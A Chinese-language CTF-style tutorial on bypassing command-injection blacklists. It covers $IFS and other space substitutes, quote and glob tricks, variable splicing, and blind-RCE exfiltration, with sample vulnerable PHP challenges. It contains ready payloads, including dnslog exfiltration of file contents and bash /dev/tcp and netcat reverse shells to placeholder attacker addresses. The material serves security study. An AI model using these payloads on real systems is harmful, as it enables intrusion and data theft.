---
title: RCE 漏洞全解——过滤绕过与无回显外带
category: 命令执行与代码执行/绕过
tags: [RCE, 命令执行, 过滤绕过, 空格绕过, 通配符, 变量拼接, 无回显, dnslog, 反弹shell]
source: 网络整理（rce 全面总结）
order: 2
---

## 一句话概括

命令执行点被发现后，真正的较量在于**绕过黑名单**：shell 自己有空格替换、通配符展开、变量拼接、命令替换等一大堆"语法糖"，任何一个都能让被过滤的关键字重新"拼"出来；而遇到无回显时，则要把结果**外带**到我们能访问的地方。

## 原理

### 1. 过滤只看"字符串"，shell 却看"语法"

绝大多数防护是在**字符串层面**做匹配：

```php
$cmd = $_GET['cmd'];
if (preg_match('/cat|flag|\s/i', $cmd)) { die('no'); }
system($cmd);
```

而 `system()` 是把这个字符串丢给 `/bin/sh -c` 去执行的。**shell 在真正找到命令之前，还会做一轮解析**：去引号、拆变量、展开通配符、做命令替换。于是同一个字符串在"正则眼中"和"shell 眼中"完全是两回事：

| 字符串（过滤看到的） | shell 解析后（真正执行的） | 结果 |
|---|---|---|
| `c''at` | `cat` | 引号被去掉，拼接成命令名 |
| `/???/??t` | `/bin/cat` | 通配符展开 |
| `a=ca;b=t;$a$b` | `cat` | 变量替换后再拼接 |
| `cat$IFS/flag` | `cat /flag` | `$IFS` 展开成空格 |

**这就是所有绕过的根**：只要最终能被 shell 还原成目标命令，中间写成什么样都行。

### 2. 为什么 `$IFS` 能当空格

`IFS` 是 shell 的**内部字段分隔符**（Internal Field Separator），默认值就是"空格 + Tab + 换行"。所以 `$IFS` 展开后正是 shell 眼中的"词与词的分隔"，`cat$IFS/flag` 与 `cat /flag` 等价，但字符串里不出现空格。

## 利用条件

1. 已有**命令执行点**（`system` / `exec` / `shell_exec` / 反引号 / `popen`）
2. 过滤规则存在**盲区**：只过滤了字面关键字、只过滤了空格、只按大小写精确匹配
3. shell 语法可用：变量展开、通配符、命令替换在 `sh` / `bash` 中都支持（部分特性仅 `bash` 支持，如花括号展开）
4. 无回显时，还需满足**外带通道**：能写文件、能发 DNS/HTTP 请求、能反弹连接

> 过滤越"严"，越说明出题人希望你去找某个特定的语法糖；顺序上先试最简单的空格/引号，再试通配符和变量。

## Payload 速查

| 目的 | 手法 | 示例 |
|---|---|---|
| 换命令 | 同类命令替代 | `tac` / `more` / `less` / `nl` / `od` / `sort` 代替 `cat` |
| 绕过空格过滤 | `$IFS` | `cat$IFS/flag` |
| 绕过空格过滤 | `${IFS}` | `cat${IFS}/flag` |
| 绕过空格过滤 | `$IFS$9` | `cat$IFS$9/flag`（`$9` 为空，断开变量名边界） |
| 绕过空格过滤 | Tab / 换行 | `cat%09/flag`、`cat%0a/flag` |
| 绕过空格过滤 | 重定向 | `cat</flag` |
| 绕过空格过滤 | 花括号展开 | `{cat,/flag}` |
| 绕关键字 | 单双引号 | `c''at /fl''ag` |
| 绕关键字 | 反斜杠 | `ca\t /fla\g` |
| 绕关键字 | 通配符（路径） | `/???/??t /fla*` |
| 绕关键字 | 中括号字符类 | `c[a]t /flag`、`/[b]in/cat` |
| 绕关键字 | 变量拼接 | `a=ca;b=t;$a$b /flag` |
| 绕关键字 | 内联执行 | `cat $(ls)`、`cat \`ls\`` |
| 绕关键字 | 环境变量切片 | `${PWD:0:1}???`（`${PWD:0:1}` = `/`） |
| 无回显 → 写文件 | 重定向 / `tee` | `cat /flag > /var/www/html/1.txt` |
| 无回显 → DNS | 命令替换 | `ping \`cat /flag\`.x.dnslog` |
| 无回显 → 反弹 | bash 内置 | `bash -i >& /dev/tcp/x.x.x.x/4444 0>&1` |

## 分节详解

### 一、常见可代替命令

当某个命令名被列入黑名单，先考虑"功能相同的另一个命令"：

| 被过滤 | 可替代 |
|---|---|
| `cat` | `tac`、`more`、`less`、`head`、`tail`、`nl`、`od`、`sort`、`uniq`、`rev`、`paste`、`strings`、`vi`、`vim`、`grep`、`awk`、`sed`、`file -f` |
| `ls` | `dir`、`echo *`、`find .` |
| `wget` | `curl`、`nc` |
| `nc` | `/dev/tcp`、`socat` |

> `cat` 的替代命令细节见《读文件命令绕过》。

### 二、空格绕过

```bash
cat$IFS/flag          # $IFS 展开为空白
cat${IFS}/flag        # 花括号写法
cat$IFS$9/flag        # $9 是空位置参数，用来"粘"住变量名
cat%09/flag           # %09 = Tab
cat%0a/flag           # %0a = 换行
cat</flag             # < 重定向，shell 同样把它当分隔
{cat,/flag}           # bash 花括号展开
```

其中 `$IFS$9` 用于防止 `$IFS` 后紧跟的字符被误当成变量名的一部分（`$IFSflag` 会被解析成变量 `IFSflag`）。

### 三、简单符号绕过正则

```bash
c''at /flag           # 两个单引号夹在中间，shell 去引号后得到 cat
c"a"t /flag           # 双引号同理
ca\t /flag            # 反斜杠转义 t，shell 解析为 cat
ca\
t /flag              # 反斜杠 + 换行：跨行续行，shell 忽略该换行
```

Linux 下命令名**区分大小写**，所以 `CAT` 不能代替 `cat`；但过滤关键字若只匹配小写，`flag` 这类"参数"可尝试改大小写或用通配符。

### 四、通配符绕过

shell 在执行命令前会做 **glob 展开**，`?` 匹配任一单字符，`*` 匹配任意多字符，`[]` 是字符类：

```bash
/???/??t /flag        # /???/ ≈ /bin/，??t 匹配 cat → /bin/cat
/???/c?t /flag        # 同上的另一种写法
c[a]t /flag           # 字符类，匹配 cat
/[b]in/cat /flag
cat /fla*             # 文件名通配：匹配 /flag、/flag.txt 等
cat /????             # 若文件就叫 /flag（4 个字符）
/???/b*64 -d 1.txt    # base64（/usr/bin/base64）
/???/b*2 x.txt        # bzip2
```

**注意**：`*` 必须能匹配到唯一的目标，否则会展开成多个参数导致报错；不确定时先用 `?` 精确控制长度。

### 五、变量拼接绕过

```bash
a=ca;b=t;$a$b /flag
c=cat;$c /flag
x=/flag;cat $x
```

也可以用空变量拼接：

```bash
cat$@ /flag           # $@ 无参数时展开为空
cat$* /flag
```

### 六、内联执行（命令替换）

把一个命令的输出当作另一个命令的参数：

```bash
cat $(ls)             # 先 ls，再把结果喂给 cat
cat `ls`              # 反引号写法
ls | xargs cat
tac $(find / -name 'flag*')
echo $(cat /flag)     # 常用于绕过对返回值的处理
```

`$(...)` 与反引号等价，但 `$(...)` 支持嵌套，可读性更好。

### 七、`${}` 截取环境变量拼接

环境变量的值本身是字符串，可以用 `${VAR:起始位:长度}` 做**切片**，从而"凭空"造出被过滤的字符：

```bash
${PWD:0:1}            # PWD 形如 /var/www/html，取第 0 位 → "/"
${HOME:0:1}           # HOME=/root → "/"
${PATH:0:1}           # PATH 首字符，通常也是 "/"
${#PATH}              # 变量长度
```

典型用法是用它拼出路径分隔符，配合通配符定位命令：

```bash
${PWD:0:1}???${PWD:0:1}??t ${PWD:0:1}flag    # → /bin/cat /flag（示意）
```

> 该手法依赖环境变量的实际内容，取值前最好先 `echo $PWD` 确认。

### 八、`[]` 中括号匹配绕过

`[]` 是 glob 字符类，效果相当于"只匹配括号里列出的字符"，但字符串里不出现连续的完整关键字：

```bash
c[a]t /flag
/[b]in/cat /flag
```

适用于黑名单做的是**子串匹配**（如 `strstr($cmd,'cat')`）的场景。

### 九、`source` 命令

`source file` 与 `. file` 等价，功能是**在当前 shell 中执行一个脚本文件**（而不是新开子 shell）。

```bash
echo 'cat /flag' > /tmp/a.sh
source /tmp/a.sh
. /tmp/a.sh
```

适用场景：`cat`、`sh`、`bash` 等命令名进了黑名单，但我们有办法先写一个脚本文件（例如通过文件上传 / 写文件漏洞），再用很少被列入黑名单的 `source` / `.` 去执行它。

### 十、无回显 RCE

有时命令确实执行了，但页面什么都不显示。常见原因：用的是 `exec()` / `shell_exec()` 且没 `echo`，或者返回值被丢弃。此时要把结果**带出去**。

#### 方法 1：复制到可访问的文件

```bash
cat /flag > /var/www/html/1.txt
cat /flag | tee /var/www/html/1.txt
ls / | tee 1.txt
cp /flag /var/www/html/flag.txt
echo $(cat /flag) > /var/www/html/1.txt
```

然后浏览器直接访问 `http://靶机地址/1.txt`。

- `>` 是覆盖重定向，`tee` 的好处是**既能落盘又能回显**（若本就有一点回显）
- 目标路径要选**网站根目录下、Web 可访问**的位置

#### 方法 2：dnslog 外带

利用命令替换把结果塞进域名，触发 DNS 查询：

```bash
ping `cat /flag`.x.dnslog
curl http://`cat /flag`.x.dnslog
nslookup $(cat /flag).x.dnslog
```

- 结果里若有特殊字符（`/`、空格、`{}`）会破坏域名，需要先编码：

```bash
curl http://`cat /flag | base64 | tr -d '\n'`.x.dnslog
```

- DNS 出站通常比 HTTP 更容易被放行，是盲命令执行的首选通道

#### 方法 3：反弹 shell

直接让目标机主动连回攻击机：

```bash
bash -i >& /dev/tcp/x.x.x.x/4444 0>&1
nc x.x.x.x 4444 -e /bin/bash
```

```bash
# 攻击机监听
nc -lvnp 4444
```

- `/dev/tcp/` 是 bash 内置特性，不需要安装任何工具，最常用
- 若 `bash` 被禁，可换 `sh -i`、`python -c '...'`、`socat`

## 完整示例

### 题目 1：直接命令执行

```php
<?php
$cmd = $_GET['cmd'];
system($cmd);
?>
```

没有任何过滤，直接：

```http
GET /?cmd=cat%20/flag HTTP/1.1
Host: 靶机地址
```

### 题目 2：过滤关键字

```php
<?php
$cmd = $_GET['cmd'];
$cmd = str_replace('flag', '', $cmd);   // 把 flag 删掉
system($cmd);
?>
```

用**双写**绕过：过滤只做一次替换，把 `flag` 写成 `flflagag`，删掉中间那层 `flag` 后，前后两截正好拼回 `flag`：

```text
输入      flflagag
str_replace 后  fl        ag   →   flag
```

```http
GET /?cmd=cat%20/flflagag HTTP/1.1
Host: 靶机地址
```

> 注意：原笔记这里写的是 `flaag`，经核对**并不能**绕过 —— `flaag` 里根本不含子串 `flag`，替换不会发生，拼出来仍是 `flaag`。正确的双写形式是 `flflagag`。

### 题目 3：字符长度限制

```php
<?php
$cmd = $_GET['cmd'];
if (strlen($cmd) < 5) {
    system($cmd);
}
?>
```

只能用极短命令，`ls` 正好满足；若要看文件，可先用最短命令写文件、再分步读取：

```http
GET /?cmd=ls HTTP/1.1
Host: 靶机地址
```

## 踩坑与备注

- **绕过顺序有讲究**：先试空格（最常被"顺手"过滤），再试引号 / 反斜杠，最后才上通配符和变量拼接。顺序反了会把简单题做复杂。
- **`*` 展开的唯一性**：`cat /f*` 若匹配到多个文件会一次读好几个，排查时容易误判成"回显串了"；先用 `ls /` 看清文件名。
- **`$IFS` 后别直接跟字母**：`$IFSflag` 会被当成变量 `IFSflag`，务必用 `${IFS}` 或 `$IFS$9` 断开。
- **无回显不等于没执行**：先确认函数是 `exec`/`shell_exec`（本来就不回显），再决定是否要外带；别急着换 payload。
- **外带优先 DNS**：写文件需要知道可访问路径，反弹需要出网端口，DNS 往往是三者里限制最少的。
- 原始笔记中还混入了一段与本主题无关的 JWT Token（属于一次性噪声），已在整理时剔除。
